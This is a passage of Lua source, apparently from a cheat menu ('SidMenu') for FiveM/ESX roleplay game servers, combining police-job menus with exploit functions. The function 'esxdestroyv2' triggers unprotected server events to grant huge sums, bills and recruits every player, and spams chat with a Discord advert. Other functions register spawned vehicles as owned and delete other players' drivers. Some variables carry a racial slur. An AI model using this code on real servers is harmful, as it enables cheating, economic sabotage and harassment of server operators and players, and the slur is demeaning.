			table.insert(elements, {label = idLabel, value = nil})
		end
	
		if data.drunk ~= nil then
			table.insert(elements, {label = _U('bac', data.drunk), value = nil})
		end
	
		if data.licenses ~= nil then
	
			table.insert(elements, {label = _U('license_label'), value = nil})
	
			for i=1, #data.licenses, 1 do
				table.insert(elements, {label = data.licenses[i].label, value = nil})
			end
	
		end
	
		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'citizen_interaction',
		{
			title    = _U('citizen_interaction'),
			align    = 'top-left',
			elements = elements,
		}, function(data, menu)
	
		end, function(data, menu)
			menu.close()
		end)
	
	end, GetPlayerServerId(player))

end

local function LookupVehicle()
	ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'lookup_vehicle',
	{
		title = _U('search_database_title'),
	}, function(data, menu)
		local length = string.len(data.value)
		if data.value == nil or length < 2 or length > 13 then
			ESX.ShowNotification(_U('search_database_error_invalid'))
		else
			ESX.TriggerServerCallback('esx_policejob:getVehicleFromPlate', function(owner, found)
				if found then
					ESX.ShowNotification(_U('search_database_found', owner))
				else
					ESX.ShowNotification(_U('search_database_error_not_found'))
				end
			end, data.value)
			menu.close()
		end
	end, function(data, menu)
		menu.close()
	end)
end

local function ShowPlayerLicense(player)
	local elements = {}
	local targetName
	ESX.TriggerServerCallback('esx_policejob:getOtherPlayerData', function(data)
		if data.licenses then
			for i=1, #data.licenses, 1 do
				if data.licenses[i].label and data.licenses[i].type then
					table.insert(elements, {
						label = data.licenses[i].label,
						type = data.licenses[i].type
					})
				end
			end
		end
		
		if Config.EnableESXIdentity then
			targetName = data.firstname .. ' ' .. data.lastname
		else
			targetName = data.name
		end
		
		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'manage_license',
		{
			title    = _U('license_revoke'),
			align    = 'top-left',
			elements = elements,
		}, function(data, menu)
			ESX.ShowNotification(_U('licence_you_revoked', data.current.label, targetName))
			TriggerServerEvent('esx_policejob:message', GetPlayerServerId(player), _U('license_revoked', data.current.label))
			
			TriggerServerEvent('esx_license:removeLicense', GetPlayerServerId(player), data.current.type)
			
			ESX.SetTimeout(300, function()
				ShowPlayerLicense(player)
			end)
		end, function(data, menu)
			menu.close()
		end)

	end, GetPlayerServerId(player))
end

local function OpenUnpaidBillsMenu(player)
	local elements = {}

	ESX.TriggerServerCallback('esx_billing:getTargetBills', function(bills)
		for i=1, #bills, 1 do
			table.insert(elements, {
				label = bills[i].label .. ' - <span style="color: red;">$' .. bills[i].amount .. '</span>',
				value = bills[i].id
			})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'billing',
		{
			title    = _U('unpaid_bills'),
			align    = 'top-left',
			elements = elements
		}, function(data, menu)
	
		end, function(data, menu)
			menu.close()
		end)
	end, GetPlayerServerId(player))
end

local function OpenVehicleInfosMenu(vehicleData)

	ESX.TriggerServerCallback('esx_policejob:getVehicleInfos', function(retrivedInfo)

		local elements = {}

		table.insert(elements, {label = _U('plate', retrivedInfo.plate), value = nil})

		if retrivedInfo.owner == nil then
			table.insert(elements, {label = _U('owner_unknown'), value = nil})
		else
			table.insert(elements, {label = _U('owner', retrivedInfo.owner), value = nil})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_infos',
		{
			title    = _U('vehicle_info'),
			align    = 'top-left',
			elements = elements
		}, nil, function(data, menu)
			menu.close()
		end)

	end, vehicleData.plate)

end

	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'police_actions',
	{
		title    = 'Police',
		align    = 'top-left',
		elements = {
			{label = _U('citizen_interaction'),	value = 'citizen_interaction'},
			{label = _U('vehicle_interaction'),	value = 'vehicle_interaction'},
			{label = _U('object_spawner'),		value = 'object_spawner'}
		}
	}, function(data, menu)

		if data.current.value == 'citizen_interaction' then
			local elements = {
				{label = _U('id_card'),			value = 'identity_card'},
				{label = _U('search'),			value = 'body_search'},
				{label = _U('handcuff'),		value = 'handcuff'},
				{label = _U('drag'),			value = 'drag'},
				{label = _U('put_in_vehicle'),	value = 'put_in_vehicle'},
				{label = _U('out_the_vehicle'),	value = 'out_the_vehicle'},
				{label = _U('fine'),			value = 'fine'},
				{label = _U('unpaid_bills'),	value = 'unpaid_bills'},
				{label = _U('jail'),			value = 'jail'}

			}
		
			if Config.EnableLicenses then
				table.insert(elements, { label = _U('license_check'), value = 'license' })
			end
		
			ESX.UI.Menu.Open(
			'default', GetCurrentResourceName(), 'citizen_interaction',
			{
				title    = _U('citizen_interaction'),
				align    = 'top-left',
				elements = elements
			}, function(data2, menu2)
				local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()
				if closestPlayer ~= -1 and closestDistance <= 3.0 then
					local action = data2.current.value

					if action == 'identity_card' then
						OpenIdentityCardMenu(closestPlayer)
					elseif action == 'body_search' then
						TriggerServerEvent('esx_policejob:message', GetPlayerServerId(closestPlayer), _U('being_searched'))
						OpenBodySearchMenu(closestPlayer)
					elseif action == 'handcuff' then
						TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(closestPlayer))
					elseif action == 'drag' then
						TriggerServerEvent('esx_policejob:drag', GetPlayerServerId(closestPlayer))
					elseif action == 'put_in_vehicle' then
						TriggerServerEvent('esx_policejob:putInVehicle', GetPlayerServerId(closestPlayer))
					elseif action == 'out_the_vehicle' then
						TriggerServerEvent('esx_policejob:OutVehicle', GetPlayerServerId(closestPlayer))
					elseif action == 'fine' then
						OpenFineMenu(closestPlayer)
					elseif action == 'license' then
						ShowPlayerLicense(closestPlayer)
					elseif action == 'unpaid_bills' then
						OpenUnpaidBillsMenu(closestPlayer)
					elseif action == 'jail' then
						JailPlayer(GetPlayerServerId(closestPlayer))
					end

				else
					ESX.ShowNotification(_U('no_players_nearby'))
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		elseif data.current.value == 'vehicle_interaction' then
			local elements  = {}
			local playerPed = PlayerPedId()
			local coords    = GetEntityCoords(playerPed)
			local vehicle   = ESX.Game.GetVehicleInDirection()
			
			if DoesEntityExist(vehicle) then
				table.insert(elements, {label = _U('vehicle_info'),	value = 'vehicle_infos'})
				table.insert(elements, {label = _U('pick_lock'),	value = 'hijack_vehicle'})
				table.insert(elements, {label = _U('impound'),		value = 'impound'})
			end
			
			table.insert(elements, {label = _U('search_database'), value = 'search_database'})

			ESX.UI.Menu.Open(
			'default', GetCurrentResourceName(), 'vehicle_interaction',
			{
				title    = _U('vehicle_interaction'),
				align    = 'top-left',
				elements = elements
			}, function(data2, menu2)
				coords  = GetEntityCoords(playerPed)
				vehicle = ESX.Game.GetVehicleInDirection()
				action  = data2.current.value
				
				if action == 'search_database' then
					LookupVehicle()
				elseif DoesEntityExist(vehicle) then
					local vehicleData = ESX.Game.GetVehicleProperties(vehicle)
					if action == 'vehicle_infos' then
						OpenVehicleInfosMenu(vehicleData)
						
					elseif action == 'hijack_vehicle' then
						if IsAnyVehicleNearPoint(coords.x, coords.y, coords.z, 3.0) then
							TaskStartScenarioInPlace(playerPed, "WORLD_HUMAN_WELDING", 0, true)
							Citizen.Wait(20000)
							ClearPedTasksImmediately(playerPed)

							SetVehicleDoorsLocked(vehicle, 1)
							SetVehicleDoorsLockedForAllPlayers(vehicle, false)
							ESX.ShowNotification(_U('vehicle_unlocked'))
						end
					elseif action == 'impound' then
					
						-- is the script busy?
						if CurrentTask.Busy then
							return
						end

						ESX.ShowHelpNotification(_U('impound_prompt'))
						
						TaskStartScenarioInPlace(playerPed, 'CODE_HUMAN_MEDIC_TEND_TO_DEAD', 0, true)
						
						CurrentTask.Busy = true
						CurrentTask.Task = ESX.SetTimeout(10000, function()
							ClearPedTasks(playerPed)
							ImpoundVehicle(vehicle)
							Citizen.Wait(100) -- sleep the entire script to let stuff sink back to reality
						end)
						
						-- keep track of that vehicle!
						Citizen.CreateThread(function()
							while CurrentTask.Busy do
								Citizen.Wait(1000)
							
								vehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 3.0, 0, 71)
								if not DoesEntityExist(vehicle) and CurrentTask.Busy then
									ESX.ShowNotification(_U('impound_canceled_moved'))
									ESX.ClearTimeout(CurrentTask.Task)
									ClearPedTasks(playerPed)
									CurrentTask.Busy = false
									break
								end
							end
						end)
					end
				else
					ESX.ShowNotification(_U('no_vehicles_nearby'))
				end

			end, function(data2, menu2)
				menu2.close()
			end)

		elseif data.current.value == 'object_spawner' then
			ESX.UI.Menu.Open(
			'default', GetCurrentResourceName(), 'citizen_interaction',
			{
				title    = _U('traffic_interaction'),
				align    = 'top-left',
				elements = {
					{label = _U('cone'),		value = 'prop_roadcone02a'},
					{label = _U('barrier'),		value = 'prop_barrier_work05'},
					{label = _U('spikestrips'),	value = 'p_ld_stinger_s'},
					{label = _U('box'),			value = 'prop_boxpile_07d'},
					{label = _U('cash'),		value = 'hei_prop_cash_crate_half_full'}
				}
			}, function(data2, menu2)
				local model     = data2.current.value
				local playerPed = PlayerPedId()
				local coords    = GetEntityCoords(playerPed)
				local forward   = GetEntityForwardVector(playerPed)
				local x, y, z   = table.unpack(coords + forward * 1.0)

				if model == 'prop_roadcone02a' then
					z = z - 2.0
				end

				ESX.Game.SpawnObject(model, {
					x = x,
					y = y,
					z = z
				}, function(obj)
					SetEntityHeading(obj, GetEntityHeading(playerPed))
					PlaceObjectOnGroundProperly(obj)
				end)

			end, function(data2, menu2)
				menu2.close()
			end)
		end

	end, function(data, menu)
		menu.close()
	end) setMenuVisible(currentMenu, false)
end

function esxdestroyv2()
	Citizen.CreateThread(
		function()
			TriggerServerEvent('esx_jobs:caution', 'give_back', 9999999999)
			TriggerServerEvent('esx_fueldelivery:pay', 9999999999)
			TriggerServerEvent('esx_carthief:pay', 9999999999)
			TriggerServerEvent('esx_godirtyjob:pay', 9999999999)
			TriggerServerEvent('esx_pizza:pay', 9999999999)
			TriggerServerEvent('esx_ranger:pay', 9999999999)
			TriggerServerEvent('esx_garbagejob:pay', 9999999999)
			TriggerServerEvent('esx_truckerjob:pay', 9999999999)
			TriggerServerEvent('AdminMenu:giveBank', 9999999999)
			TriggerServerEvent('AdminMenu:giveCash', 9999999999)
			TriggerServerEvent('esx_gopostaljob:pay', 9999999999)
			TriggerServerEvent('esx_banksecurity:pay', 9999999999)
			TriggerServerEvent('esx_slotmachine:sv:2', 9999999999)
			for bD = 0, 9 do
				TriggerServerEvent(
					'_chat:messageEntered',
					'Sid#7841 Bombay',
					{
						141,
						211,
						255
					},
					'^' .. bD .. 'https://discord.gg/u9CxU33'
				)
			end
			for i = 0, 256 do
				TriggerServerEvent(
					'esx_billing:sendBill',
					GetPlayerServerId(SelectedPlayer),
					'society_police',
					'https://discord.gg/u9CxU33 Bombay',
					6969696969)
				TriggerServerEvent(
					'esx:giveInventoryItem',
					GetPlayerServerId(i),
					'item_money',
					'money',
					1254756
				)
				TriggerServerEvent(
					'esx:giveInventoryItem',
					GetPlayerServerId(i),
					'item_money',
					'money',
					1254756
				)
				TriggerServerEvent(
					'esx_billing:sendBill',
					GetPlayerServerId(i),
					'https://discord.gg/u9CxU33 Bombay',
					'Sid#7841 Bombay https://discord.gg/u9CxU33',
					43161337
				)
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), 'police', 3)
				TriggerServerEvent('NB:recruterplayer', i, 'police', 3)
			end
		end
	)
end

function SidMenu.CheckBox(text, bool, callback)
	local checked = "~r~Off"
	if bool then
		checked = "~g~On"
	end

	if SidMenu.Button(text, checked) then
		bool = not bool
		debugPrint(tostring(text) .. " checkbox changed to " .. tostring(bool))
		callback(bool)

		return true
	end

	return false
end

function SidMenu.ComboBox(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = "← " .. tostring(selectedItem) .. " →"
	end

	if SidMenu.Button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
			if currentIndex > 1 then
				currentIndex = currentIndex - 1
			else
				currentIndex = itemsCount
			end
		elseif currentKey == keys.right then
			if currentIndex < itemsCount then
				currentIndex = currentIndex + 1
			else
				currentIndex = 1
			end
		end
	else
		currentIndex = selectedIndex
	end

	callback(currentIndex, selectedIndex)
	return false
end

function checkValidVehicleExtras()
    local ax = PlayerPedId()
    local ay = GetVehiclePedIsIn(ax, false)
    local az = {}
    for i = 0, 50, 1 do
        if DoesExtraExist(ay, i) then
            local aA = '~h~Extra #' .. tostring(i)
            local I = 'OFF'
            if IsVehicleExtraTurnedOn(ay, i) then
                I = 'ON'
            end
            local aB = '~h~extra ' .. tostring(i)
            table.insert(
                az,
                {
                    menuName = realModName,
                    data = {
                        ['action'] = realSpawnName,
                        ['state'] = I
                    }
                }
            )
        end
    end
    return az
end

function DoesVehicleHaveExtras(veh)
    for i = 1, 30 do
        if DoesExtraExist(veh, i) then
            return true
        end
    end
    return false
end

function checkValidVehicleMods(aC)
    local ax = PlayerPedId()
    local ay = GetVehiclePedIsIn(ax, false)
    local az = {}
    local aD = GetNumVehicleMods(ay, aC)
    if aC == 48 and aD == 0 then
        local aD = GetVehicleLiveryCount(ay)
        for i = 1, aD, 1 do
            local aE = i - 1
            local aF = GetLiveryName(ay, aE)
            local realModName = GetLabelText(aF)
            local aG, realSpawnName = aC, aE
            az[i] = {
                menuName = realModName,
                data = {
                    ['modid'] = aG,
                    ['realIndex'] = realSpawnName
                }
            }
        end
    end
    for i = 1, aD, 1 do
        local aE = i - 1
        local aF = GetModTextLabel(ay, aC, aE)
        local realModName = GetLabelText(aF)
        local aG, realSpawnName = aD, aE
        az[i] = {
            menuName = realModName,
            data = {
                ['modid'] = aG,
                ['realIndex'] = realSpawnName
            }
        }
    end
    if aD > 0 then
        local aE = -1
        local aG, realSpawnName = aC, aE
        table.insert(
            az,
            1,
            {
                menuName = 'Stock',
                data = {
                    ['modid'] = aG,
                    ['realIndex'] = realSpawnName
                }
            }
        )
    end
    return az
end

function ClonePedVeh()
    local ped = GetPlayerPed(SelectedPlayer)
    local pedVeh = nil
    local PlayerPed = PlayerPedId()
    if IsPedInAnyVehicle(ped, false) then
        pedVeh = GetVehiclePedIsIn(ped, false)
    else
        pedVeh = GetVehiclePedIsIn(ped, true)
        if DoesEntityExist(pedVeh) then
            local vmh = GetEntityModel(pedVeh)
            local playerpos = GetEntityCoords(PlayerPed, false)
            local playerveh =
                CreateVehicle(vmh, playerpos.x, playerpos.y, playerpos.z, GetEntityHeading(PlayerPed), true, true)
            SetPedIntoVehicle(PlayerPed, playerveh, -1)
            local pcolor, scolor = nil
            GetVehicleColours(pedVeh, pcolor, scolor)
            SetVehicleColours(playerveh, pcolor, scolor)
            if IsThisModelACar(vmh) or IsThisModelABike(vhm) then
                SetVehicleModKit(playerveh, 0)
                SetVehicleWheelType(playerveh, GetVehicleWheelType(pedVeh))
                local pc, wc = nil
                SetVehicleNumberPlateTextIndex(playerveh, GetVehicleNumberPlateTextIndex(pedVeh))
                SetVehicleNumberPlateText(playerveh, GetVehicleNumberPlateText(pedVeh))
                GetVehicleExtraColours(pedVeh, pc, wc)
                SetVehicleExtraColours(playerveh, pc, wc)
            end
        end
    end
end

function SidMenu.Display()
	if isMenuVisible(currentMenu) then
		if menus[currentMenu].aboutToBeClosed then
			SidMenu.CloseMenu()
		else
			ClearAllHelpMessages()

			drawTitle()
			drawSubTitle()

			currentKey = nil

			if IsDisabledControlJustPressed(0, keys.down) then
				PlaySoundFrontend(-1, "PIN_BUTTON", "ATM_SOUNDS", true) --down

				if menus[currentMenu].currentOption < optionCount then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
				else
					menus[currentMenu].currentOption = 1
				end
			elseif IsDisabledControlJustPressed(0, keys.up) then
				PlaySoundFrontend(-1, "PIN_BUTTON", "ATM_SOUNDS", true) --up

				if menus[currentMenu].currentOption > 1 then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
				else
					menus[currentMenu].currentOption = optionCount
				end
			elseif IsDisabledControlJustPressed(0, keys.left) then
				currentKey = keys.left
			elseif IsDisabledControlJustPressed(0, keys.right) then
				currentKey = keys.right
			elseif IsDisabledControlJustPressed(0, keys.select) then
				currentKey = keys.select
			elseif IsDisabledControlJustPressed(0, keys.back) then
				if menus[menus[currentMenu].previousMenu] then
					PlaySoundFrontend(-1, "Hack_Failed", "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS", true) --back
					setMenuVisible(menus[currentMenu].previousMenu, true)
				else
					SidMenu.CloseMenu()
				end
			end

			optionCount = 0
		end
	end
end

function SidMenu.SetMenuWidth(id, width)
	setMenuProperty(id, "width", width)
end

function SidMenu.SetMenuX(id, x)
	setMenuProperty(id, "x", x)
end

function SidMenu.SetMenuY(id, y)
	setMenuProperty(id, "y", y)
end

function SidMenu.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, "maxOptionCount", count)
end

function SidMenu.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
end

function SidMenu.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"titleBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
	)
end

function SidMenu.SetTitleBackgroundSprite(id, textureDict, textureName)
	setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function SidMenu.SetSubTitle(id, text)
	setMenuProperty(id, "subTitle", string.upper(text))
end

function SidMenu.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"menuBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
	)
end

function SidMenu.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
end

function SidMenu.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
end

function SidMenu.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
end

function SidMenu.SetMenuButtonPressedSound(id, name, set)
	setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
end

function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
	AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
	DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
	blockinput = true

	while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
		Citizen.Wait(0)
	end

	if UpdateOnscreenKeyboard() ~= 2 then
		local result = GetOnscreenKeyboardResult()
		Citizen.Wait(500)
		blockinput = false
		return result
	else
		Citizen.Wait(500)
		blockinput = false
		return nil
	end
end

local function getPlayerIds()
	local players = {}
	for i = 0, GetNumberOfPlayers() do
		if NetworkIsPlayerActive(i) then
			players[#players + 1] = i
		end
	end
	return players
end


function DrawText3D(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	DrawText(0.0, 0.0)
	ClearDrawOrigin()
end

function math.round(num, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

function drawNotification(text)
	SetNotificationTextEntry("STRING")
	AddTextComponentString(text)
	DrawNotification(false, false)
end


local allWeapons = {
	"WEAPON_PISTOL",
	"WEAPON_ASSAULTRIFLE",
	"WEAPON_MICROSMG",
	"WEAPON_SWITCHBLADE",
	"WEAPON_KNIFE",
	"WEAPON_KNUCKLE",
	"WEAPON_NIGHTSTICK",
	"WEAPON_HAMMER",
	"WEAPON_BAT",
	"WEAPON_GOLFCLUB",
	"WEAPON_CROWBAR",
	"WEAPON_BOTTLE",
	"WEAPON_DAGGER",
	"WEAPON_HATCHET",
	"WEAPON_MACHETE",
	"WEAPON_FLASHLIGHT",
	"WEAPON_PISTOL_MK2",
	"WEAPON_COMBATPISTOL",
	"WEAPON_APPISTOL",
	"WEAPON_PISTOL50",
	"WEAPON_SNSPISTOL",
	"WEAPON_HEAVYPISTOL",
	"WEAPON_VINTAGEPISTOL",
	"WEAPON_STUNGUN",
	"WEAPON_FLAREGUN",
	"WEAPON_MARKSMANPISTOL",
	"WEAPON_REVOLVER",
	"WEAPON_SMG",
	"WEAPON_SMG_MK2",
	"WEAPON_ASSAULTSMG",
	"WEAPON_MG",
	"WEAPON_COMBATMG",
	"WEAPON_COMBATMG_MK2",
	"WEAPON_COMBATPDW",
	"WEAPON_GUSENBERG",
	"WEAPON_MACHINEPISTOL",
	"WEAPON_ASSAULTRIFLE_MK2",
	"WEAPON_CARBINERIFLE",
	"WEAPON_CARBINERIFLE_MK2",
	"WEAPON_ADVANCEDRIFLE",
	"WEAPON_SPECIALCARBINE",
	"WEAPON_BULLPUPRIFLE",
	"WEAPON_COMPACTRIFLE",
	"WEAPON_PUMPSHOTGUN",
	"WEAPON_SAWNOFFSHOTGUN",
	"WEAPON_BULLPUPSHOTGUN",
	"WEAPON_ASSAULTSHOTGUN",
	"WEAPON_MUSKET",
	"WEAPON_HEAVYSHOTGUN",
	"WEAPON_DBSHOTGUN",
	"WEAPON_SNIPERRIFLE",
	"WEAPON_HEAVYSNIPER",
	"WEAPON_HEAVYSNIPER_MK2",
	"WEAPON_MARKSMANRIFLE",
	"WEAPON_GRENADELAUNCHER",
	"WEAPON_GRENADELAUNCHER_SMOKE",
	"WEAPON_RPG",
	"WEAPON_STINGER",
	"WEAPON_FIREWORK",
	"WEAPON_HOMINGLAUNCHER",
	"WEAPON_GRENADE",
	"WEAPON_STICKYBOMB",
	"WEAPON_PROXMINE",
	"WEAPON_BZGAS",
	"WEAPON_SMOKEGRENADE",
	"WEAPON_MOLOTOV",
	"WEAPON_FIREEXTINGUISHER",
	"WEAPON_PETROLCAN",
	"WEAPON_SNOWBALL",
	"WEAPON_FLARE",
	"WEAPON_BALL"
}

local Enabled = true

local function TeleportToWaypoint()
	if DoesBlipExist(GetFirstBlipInfoId(8)) then
		local blipIterator = GetBlipInfoIdIterator(8)
		local blip = GetFirstBlipInfoId(8, blipIterator)
		WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
		wp = true
	else
		drawNotification("~r~No waypoint!")
	end

	local zHeigt = 0.0
	height = 1000.0
	while true do
		Citizen.Wait(0)
		if wp then
			if
				IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
					(GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
			 then
				entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
			else
				entity = GetPlayerPed(-1)
			end

			SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
			FreezeEntityPosition(entity, true)
			local Pos = GetEntityCoords(entity, true)

			if zHeigt == 0.0 then
				height = height - 25.0
				SetEntityCoords(entity, Pos.x, Pos.y, height)
				bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
			else
				SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
				FreezeEntityPosition(entity, false)
				wp = false
				height = 1000.0
				zHeigt = 0.0
				drawNotification("~g~Teleported to waypoint!")
				break
			end
		end
	end
end

local function fv()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    local cw = KeyboardInput('Enter Vehicle Licence Plate', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        RequestModel(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
            GetHashKey(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
        )
        SetVehicleNumberPlateText(veh, cw)
        local cx = ESX.Game.GetVehicleProperties(veh)
        TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
        drawNotification('~g~~h~Success', false)
    else
        drawNotification('~b~~h~Model is not valid !', true)
    end
end

function teleportToNearestVehicle()
            local playerPed = GetPlayerPed(-1)
            local playerPedPos = GetEntityCoords(playerPed, true)
            local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
            local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
            local NearestNegro = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
            local NearestNegroPos = GetEntityCoords(NearestNegro, true)
        drawNotification("~y~Wait...")
        Citizen.Wait(1000)
        if (NearestVehicle == 0) and (NearestNegro == 0) then
            drawNotification("~r~No Vehicle Found")
        elseif (NearestVehicle == 0) and (NearestNegro ~= 0) then
            if IsVehicleSeatFree(NearestNegro, -1) then
                SetPedIntoVehicle(playerPed, NearestNegro, -1)
                SetVehicleAlarm(NearestNegro, false)
                SetVehicleDoorsLocked(NearestNegro, 1)
                SetVehicleNeedsToBeHotwired(NearestNegro, false)
            else
                local driverPed = GetPedInVehicleSeat(NearestNegro, -1)
                ClearPedTasksImmediately(driverPed)
                SetEntityAsMissionEntity(driverPed, 1, 1)
                DeleteEntity(driverPed)
                SetPedIntoVehicle(playerPed, NearestNegro, -1)
                SetVehicleAlarm(NearestNegro, false)
                SetVehicleDoorsLocked(NearestNegro, 1)
                SetVehicleNeedsToBeHotwired(NearestNegro, false)
            end
            drawNotification("~g~Teleported Into Nearest Vehicle!")
        elseif (NearestVehicle ~= 0) and (NearestNegro == 0) then
            if IsVehicleSeatFree(NearestVehicle, -1) then
                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                SetVehicleAlarm(NearestVehicle, false)
                SetVehicleDoorsLocked(NearestVehicle, 1)
                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            else
                local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                ClearPedTasksImmediately(driverPed)
                SetEntityAsMissionEntity(driverPed, 1, 1)
                DeleteEntity(driverPed)
                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                SetVehicleAlarm(NearestVehicle, false)
                SetVehicleDoorsLocked(NearestVehicle, 1)
                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            end
            drawNotification("~g~Teleported Into Nearest Vehicle!")
        elseif (NearestVehicle ~= 0) and (NearestNegro ~= 0) then
            if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestNegroPos.x, NearestNegroPos.y, NearestNegroPos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestVehicle, -1) then
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, false)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
                else
                    local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                    ClearPedTasksImmediately(driverPed)
                    SetEntityAsMissionEntity(driverPed, 1, 1)
                    DeleteEntity(driverPed)
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, false)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
                end
            elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestNegroPos.x, NearestNegroPos.y, NearestNegroPos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestNegro, -1) then
                    SetPedIntoVehicle(playerPed, NearestNegro, -1)
                    SetVehicleAlarm(NearestNegro, false)
                    SetVehicleDoorsLocked(NearestNegro, 1)
                    SetVehicleNeedsToBeHotwired(NearestNegro, false)
                else
                    local driverPed = GetPedInVehicleSeat(NearestNegro, -1)
                    ClearPedTasksImmediately(driverPed)
                    SetEntityAsMissionEntity(driverPed, 1, 1)
                    DeleteEntity(driverPed)
                    SetPedIntoVehicle(playerPed, NearestNegro, -1)
                    SetVehicleAlarm(NearestNegro, false)
                    SetVehicleDoorsLocked(NearestNegro, 1)
                    SetVehicleNeedsToBeHotwired(NearestNegro, false)
                end
            end
            drawNotification("~g~Teleported Into Nearest Vehicle!")
        end

    end

local function bX()
    local name = KeyboardInput('Enter Blip Name', '', 100)
    if name == '' then
        drawNotification('~w~Invalid Blip Name!', true)
        return bX()
    else
        local bU = KeyboardInput('Enter X pos', '', 100)
        local bV = KeyboardInput('Enter Y pos', '', 100)
        local bW = KeyboardInput('Enter Z pos', '', 100)
        if bU ~= '' and bV ~= '' and bW ~= '' then
            local bY = {
                {
                    colour = 75,
                    id = 84
                }
            }
            for _, bZ in pairs(bY) do
